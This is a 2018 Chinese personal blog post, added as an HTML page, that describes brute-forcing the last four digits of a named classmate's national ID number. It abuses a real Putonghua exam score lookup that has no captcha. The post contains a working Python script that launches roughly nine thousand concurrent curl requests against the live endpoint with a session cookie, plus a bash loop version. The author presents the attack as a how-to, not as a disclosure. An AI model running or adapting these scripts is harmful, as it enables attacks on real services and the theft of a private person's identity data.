@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>高并发API测试脚本 | mingjun97的blog</title>
+  <meta name="description" content="日常填坑的各种记录" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Noto+Serif:400,700,400italic|Open+Sans:700,400" />
+
+  <meta name="generator" content="mingjun97的blog">
+
+  
+  
+  
+
+  
+</head>
+
+
+<body class="post-template">
+
+  <header class="site-head"  style="background-image: url(//blog.ghost.org/content/images/2013/Nov/cover.png)" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="//lyric.today/img/logo.png" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">mingjun97的blog</h1>
+            <h2 class="blog-description">日常填坑的各种记录</h2>
+        </div>
+    </div>
+</header>
+  
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2018-09-06T21:35:16.000Z" itemprop="datePublished">
+          2018-09-06
+      </time>
+    
+    
+    | 
+    <a href='/tags/python/'>python</a>
+    
+    
+</span>
+    <h1 class="post-title">高并发API测试脚本</h1>
+    <section class="post-content">
+      <p>通过一定的手段拿到了某同学的身份证号前6位和生日，利用普通话考试系统查询成绩不需要验证码的业务逻辑漏洞，确认该同学参加过普通话考试，遂编写python脚本如下对该同学的身份证号后四位进行爆破。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inquiry</span><span class="params">(id)</span>:</span></span><br><span class="line">    r = os.popen(<span class="string">r"curl 'http://www.cltt.org/StudentScore/ScoreResult' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Origin: http://www.cltt.org' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: http://www.cltt.org/studentscore' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: zh-CN,zh;q=0.9,ja;q=0.8,en;q=0.7,zh-TW;q=0.6' -H 'Cookie: aliyungf_tc=AQAAANWP1Fs2jA4A7itfR5Mbkqy5xaQh; ASP.NET_SessionId=iplra4tpuhk0bhlmel3kqdlk' --data 'name=URLENCODED&amp;stuID=&amp;idCard=xxxxxx"</span>+str(id)+<span class="string">"' --compressed"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"考试时间"</span> <span class="keyword">in</span> r.read():</span><br><span class="line">        print(id)    </span><br><span class="line">    <span class="comment"># print(r)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">9999</span>):</span><br><span class="line">        p = Process(target=inquiry, args=(i,))</span><br><span class="line">        p.start()</span><br></pre></td></tr></table></figure></p>
+<p>运行时执行以下指令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py &gt; result</span><br></pre></td></tr></table></figure></p>
+<p>而后可以观察到文件夹内出现了文件result，试用cat指令即可查看。</p>
+<h5 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h5><p>shell脚本进行单线程遍历，发现效率很低（1000～9999大概需要遍历4000秒，遂放弃。此处将脚本贴出。）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ((i=2000;i&lt;=9999;i++)); <span class="keyword">do</span>; <span class="built_in">echo</span> <span class="variable">$i</span>; curl <span class="string">'http://www.cltt.org/StudentScore/ScoreResult'</span> -H <span class="string">'Connection: keep-alive'</span> -H <span class="string">'Cache-Control: max-age=0'</span> -H <span class="string">'Origin: http://www.cltt.org'</span> -H <span class="string">'Upgrade-Insecure-Requests: 1'</span> -H <span class="string">'Content-Type: application/x-www-form-urlencoded'</span> -H <span class="string">'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span> -H <span class="string">'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'</span> -H <span class="string">'Referer: http://www.cltt.org/studentscore'</span> -H <span class="string">'Accept-Encoding: gzip, deflate'</span> -H <span class="string">'Accept-Language: zh-CN,zh;q=0.9,ja;q=0.8,en;q=0.7,zh-TW;q=0.6'</span> -H <span class="string">'Cookie: aliyungf_tc=AQAAANWP1Fs2jA4A7itfR5Mbkqy5xaQh; ASP.NET_SessionId=iplra4tpuhk0bhlmel3kqdlk'</span> --data <span class="string">'name=URLENCODED&amp;stuID=&amp;idCard=xxxxxx19971020`echo $i`'</span> --compressed | grep <span class="string">"考试时间"</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>mingjun97</h4>
+    <p>信息安全在读本科生 略懂CTF 全栈开发</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://mingjun97.github.io/2018/09/06/高并发API测试脚本/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://mingjun97.github.io/2018/09/06/高并发API测试脚本/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://mingjun97.github.io/2018/09/06/高并发API测试脚本/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <span class="page-number">•</span>
+    
+    <a class="older-posts" href="/2018/05/02/React踩坑记录2-this-setState-频繁刷新导致性能下降/">
+        React踩坑记录2 - this.setState()频繁刷新导致性能下降 →
+    </a>
+    
+</nav>
+  <div id="comment" class="comments-area">
+    <h1 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h1>
+
+    
+</div>
+</main>
+
+
+  
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">mingjun97的blog</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+
+
+
+
+
+
+</body>
+</html>
